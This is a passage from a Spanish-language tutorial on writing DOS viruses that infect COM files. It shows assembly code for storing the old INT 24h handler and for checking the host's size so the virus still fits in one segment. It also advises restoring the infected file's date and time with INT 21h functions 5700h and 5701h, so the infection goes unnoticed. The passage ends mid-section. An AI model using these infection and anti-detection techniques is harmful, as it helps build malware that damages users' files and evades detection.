&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Fijate en las variables que a&ntilde;ado a la zona de variables

&nbsp;old_int24&nbsp; label dword
&nbsp;old_int24_off&nbsp;&nbsp;&nbsp; dw 0
&nbsp;old_int24_seg&nbsp;&nbsp;&nbsp; dw 0

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Defino una etiqueta llamada old_int24 para referenciar el inicio
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a los valores del offset y del segmento de la interrupcion 24 as&iacute;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; con el comando lds dx,cs:old_int24 los puedo cargar directamente
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; en DS:DX sin tener que leer las 2 variables por separado.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Otras mejoras que podr&iacute;amos a&ntilde;adir es la verificaci&oacute;n del tama&ntilde;o
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; del archivo. Ten en cuenta que un archivo com s&oacute;lo puede tener
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 65 kbytes de tama&ntilde;o eso hace que si el hoste est&nbsp; muy cerca de
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ese tama&ntilde;o y si t&uacute; le a&ntilde;ades el c&oacute;digo del virus ,el conjunto
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; de hoste+virus no se podr&iacute;a&nbsp; cargar en un &uacute;nico segmento por lo
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; que el programa se colgar&iacute;a .
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Por eso lo mejor es verificar el tama&ntilde;o con una rutina como esta
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (supongo en la variable longitud el tama&ntilde;o del hoste)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ....

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov ax,50000d
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cmp word ptr [bp+longitud],ax
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jb&nbsp; size_ok&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;salto si el primer elemento
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp salir&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;a comparar es menor al segundo
size_ok:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Tambi&eacute;n es interesante guardar la hora y la fecha del archivo
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; contaminado y luego restaurar la fecha y la hora , as&iacute; nadie
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; se dar&aacute;&nbsp; cuenta que la &uacute;ltima modificaci&oacute;n del archivo fu&eacute; cuando
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; el virus le contamin&oacute; }:>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Para eso utilizaremos la funci&oacute;n ax=5700h de la int 21 para leer
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; la fecha del archivo y la ax=5701h para cambiarla.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; En dx se obtendr&aacute; el campo de la hora y en cx la fecha.Seg&uacute;n
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; el siguiente criterio.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Bit(s)</pre>

</body>
</html>
